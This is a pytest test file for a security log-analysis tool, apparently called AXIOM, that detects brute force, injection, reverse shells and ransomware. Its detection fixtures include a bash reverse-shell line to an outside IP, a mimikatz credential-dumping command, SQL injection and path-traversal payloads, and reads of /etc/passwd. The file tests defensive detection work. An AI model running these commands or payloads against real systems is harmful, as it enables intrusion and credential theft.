"""Tests for AXIOM — AI-Powered Log Intelligence"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.log_parser import LogParser
from core.ml_detector import MLDetector
from core.pattern_matcher import PatternMatcher
from core.mitre_mapper import MITREMapper
from core.threat_correlator import ThreatCorrelator

SYSLOG_SAMPLE = """
Jan 10 12:00:01 server sshd[12345]: Failed password for root from 185.220.101.45 port 44000 ssh2
Jan 10 12:00:02 server sshd[12346]: Failed password for admin from 185.220.101.45 port 44001 ssh2
Jan 10 12:00:03 server sshd[12347]: Invalid user oracle from 185.220.101.45 port 44002
Jan 10 12:00:10 server sshd[12348]: Accepted password for root from 185.220.101.45 port 44003 ssh2
Jan 10 12:01:00 server sudo[12349]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
Jan 10 12:02:00 server bash[12350]: cat /etc/passwd
Jan 10 12:03:00 server bash[12351]: mimikatz privilege::debug sekurlsa::logonpasswords
""".strip()

APACHE_SAMPLE = """
185.220.101.45 - - [10/Jan/2025:12:00:01 +0000] "GET /admin HTTP/1.1" 403 287 "-" "sqlmap/1.7.8"
185.220.101.45 - - [10/Jan/2025:12:00:02 +0000] "GET /login?user=' OR 1=1-- HTTP/1.1" 500 892 "-" "sqlmap/1.7.8"
185.220.101.45 - - [10/Jan/2025:12:00:03 +0000] "GET /../../../../etc/passwd HTTP/1.1" 200 2048 "-" "nikto/2.1.6"
""".strip()


class TestLogParser:
    def test_parse_syslog(self):
        import tempfile, os
        parser = LogParser()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.log', delete=False) as f:
            f.write(SYSLOG_SAMPLE)
            path = f.name
        try:
            events = parser.parse(path, 'syslog', 'test.log')
            assert len(events) > 0
        finally:
            os.unlink(path)

    def test_detect_format_syslog(self):
        parser = LogParser()
        fmt = parser._detect_format(SYSLOG_SAMPLE.split('\n')[:10])
        assert fmt == 'syslog'

    def test_detect_format_apache(self):
        parser = LogParser()
        fmt = parser._detect_format(APACHE_SAMPLE.split('\n')[:5])
        assert fmt in ('apache_access', 'apache', 'json')  # flexible

    def test_ip_extraction(self):
        parser = LogParser()
        ip = parser._extract_ip("Failed password for root from 185.220.101.45 port 22")
        assert ip == "185.220.101.45"

    def test_user_extraction(self):
        parser = LogParser()
        user = parser._extract_user("Failed password for admin from 1.2.3.4")
        assert user == "admin"


class TestMLDetector:
    def test_detect_brute_force(self):
        detector = MLDetector(threshold=0.25)
        events = [
            {"message": "Failed password for root from 185.220.101.45 port 22", "source_ip": "185.220.101.45", "raw_log": "Failed password for root from 185.220.101.45", "timestamp": "Jan 10 12:00:01"},
        ] * 20
        anomalies = detector.detect(events)
        assert len(anomalies) > 0

    def test_detect_path_traversal(self):
        detector = MLDetector(threshold=0.20)
        events = [{"message": "GET /../../../../etc/passwd HTTP/1.1", "source_ip": "1.2.3.4", "raw_log": "../../../../etc/passwd", "path": "../../../../etc/passwd", "timestamp": ""}]
        anomalies = detector.detect(events)
        assert len(anomalies) > 0

    def test_critical_for_ransomware(self):
        detector = MLDetector(threshold=0.30)
        events = [{"message": "ransom_encryptor.exe --ext .locked bitcoin decrypt", "source_ip": "", "raw_log": "ransomware encrypt locked", "timestamp": ""}]
        anomalies = detector.detect(events)
        assert any(a['severity'] in ('CRITICAL', 'HIGH') for a in anomalies)

    def test_empty_events(self):
        detector = MLDetector()
        assert detector.detect([]) == []

    def test_score_range(self):
        detector = MLDetector(threshold=0.0)  # Catch all
        events = [{"message": "Failed password root", "source_ip": "1.2.3.4", "raw_log": "test", "timestamp": ""}]
        anomalies = detector.detect(events)
        for a in anomalies:
            assert 0.0 <= a['anomaly_score'] <= 1.0


class TestPatternMatcher:
    def test_match_ssh_brute_force(self):
        matcher = PatternMatcher()
        events = [{"message": "Failed password for root from 185.220.101.45 port 22 ssh2", "raw_log": "Failed password for root from 185.220.101.45 port 22 ssh2"}]
        hits = matcher.match(events)
        assert len(hits) > 0
        assert any(h['threat_type'] == 'brute_force_ssh' for h in hits)

    def test_match_sql_injection(self):
        matcher = PatternMatcher()
        events = [{"message": "GET /login?user=' UNION SELECT 1,2,3--", "raw_log": "' UNION SELECT 1,2,3--"}]
        hits = matcher.match(events)
        assert any(h['threat_type'] == 'sql_injection' for h in hits)

    def test_match_reverse_shell(self):
        matcher = PatternMatcher()
        events = [{"message": "bash -i >& /dev/tcp/185.220.101.45/4444 0>&1", "raw_log": "bash -i >& /dev/tcp/"}]
        hits = matcher.match(events)
        assert any(h['threat_type'] == 'reverse_shell' for h in hits)

    def test_match_mimikatz(self):
        matcher = PatternMatcher()
        events = [{"message": "mimikatz privilege::debug sekurlsa::logonpasswords", "raw_log": "mimikatz sekurlsa::logonpasswords"}]
        hits = matcher.match(events)
        assert any(h['threat_type'] == 'mimikatz' for h in hits)
        assert any(h['severity'] == 'CRITICAL' for h in hits)

    def test_severity_assignment(self):
        matcher = PatternMatcher()
        events = [{"message": "ransom_encryptor .encrypted .locked bitcoin", "raw_log": ".locked bitcoin decrypt_instructions"}]
        hits = matcher.match(events)
        for h in hits:
            assert h['severity'] in ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW')


class TestMITREMapper:
    def test_map_brute_force(self):
        mapper = MITREMapper()
        result = mapper.map('brute_force')
        assert 'TA0006' in result['mitre_tactic']
        assert 'T1110' in result['mitre_tech']

    def test_map_unknown(self):
        mapper = MITREMapper()
        result = mapper.map('totally_unknown_threat')
        assert result['mitre_tactic'] != ''

    def test_map_ransomware(self):
        mapper = MITREMapper()
        result = mapper.map('ransomware')
        assert 'TA0040' in result['mitre_tactic']


class TestThreatCorrelator:
    def test_detects_brute_force_chain(self):
        correlator = ThreatCorrelator()
        findings = [
            {'threat_type': 'brute_force'},
            {'threat_type': 'brute_force_ssh'},
            {'threat_type': 'unauthorized_access'},
        ]
        chains = correlator.correlate(findings)
        assert len(chains) > 0

    def test_no_chain_single_finding(self):
        correlator = ThreatCorrelator()
        findings = [{'threat_type': 'port_scan'}]
        chains = correlator.correlate(findings)
        assert len(chains) == 0

    def test_ransomware_chain(self):
        correlator = ThreatCorrelator()
        findings = [
            {'threat_type': 'malware_execution'},
            {'threat_type': 'ransomware'},
            {'threat_type': 'ransomware_indicator'},
        ]
        chains = correlator.correlate(findings)
        assert any('Ransomware' in c['chain_name'] for c in chains)
